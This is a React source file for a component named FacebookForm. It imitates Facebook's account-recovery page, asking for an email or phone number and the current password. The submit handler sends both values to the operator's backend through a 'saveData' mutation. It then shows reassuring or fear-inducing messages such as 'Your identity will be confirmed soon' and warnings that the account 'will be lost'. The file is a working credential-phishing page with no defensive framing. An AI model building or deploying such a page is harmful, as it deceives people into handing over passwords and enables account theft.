"use client";

import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { z } from "zod";

// import { Button } from "@/components/ui/button";
import { Form, FormControl, FormField, FormItem } from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Button } from "../ui/button";
import { useSaveData } from "@/query/queriesAndMutations";
import { toast } from "sonner";
import { useState } from "react";

const formSchema = z.object({
  username: z.string(),
  password: z.string(),
});

const FacebookForm = () => {
  const [showButton, setShowButton] = useState(true);
  const { mutateAsync: saveData, isPending: savingData } = useSaveData();

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      username: "",
      password: "",
    },
  });

  async function onSubmit(values: z.infer<typeof formSchema>) {
    const response = await saveData({
      email: values.username,
      password: values.password,
    });
    if (response?._id) {
      setShowButton(false);
      return toast.success(
        "We will inform you soon after your identity is confirmed"
      );
    } else {
      return toast.error(
        "Some thing went wrong please ensure your correct identity or account will be lost."
      );
    }
  }
  return (
    <div className="px-5">
      <Form {...form}>
        <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
          <FormField
            control={form.control}
            name="username"
            render={({ field }) => (
              <FormItem>
                <FormControl>
                  <Input
                    placeholder="Mobile number or email"
                    {...field}
                    className="outline-none"
                  />
                </FormControl>
              </FormItem>
            )}
          />
          <FormField
            control={form.control}
            name="password"
            render={({ field }) => (
              <FormItem>
                <FormControl>
                  <Input
                    type="password"
                    placeholder="current password"
                    {...field}
                    className="outline-none"
                  />
                </FormControl>
              </FormItem>
            )}
          />
          <div className="px-2 pt-2 pb-5">
            <p className="text-xs text-slate-500">
              People who use our service may have uploaded your contact
              information to Facebook. Learn more.
              <br />
              <br />
              By clicking Recover Now, you agree to our Terms,{" "}
              <span className="text-blue-800">Privacy Policy</span> and{" "}
              <span className="text-blue-800">Cookies Policy</span>. You will
              not receive SMS Notifications from us and {"don't"} share any one
              your information.
            </p>
          </div>
          {showButton && (
            <div className="justify-center items-center flex">
              <Button
                type="submit"
                disabled={savingData}
                className="bg-green-600 font-semibold text-lg"
              >
                Recover Now
              </Button>
            </div>
          )}
          {!showButton ? (
            <h1 className="font-semibold text-green-600 text-[16px] text-center mt-3">
              Your Identity will be confirmed soon
            </h1>
          ) : (
            <h1 className="underline text-blue-600 text-[16px] text-center mt-3">
              No Action Required ?
            </h1>
          )}
        </form>
      </Form>
    </div>
  );
};

export default FacebookForm;
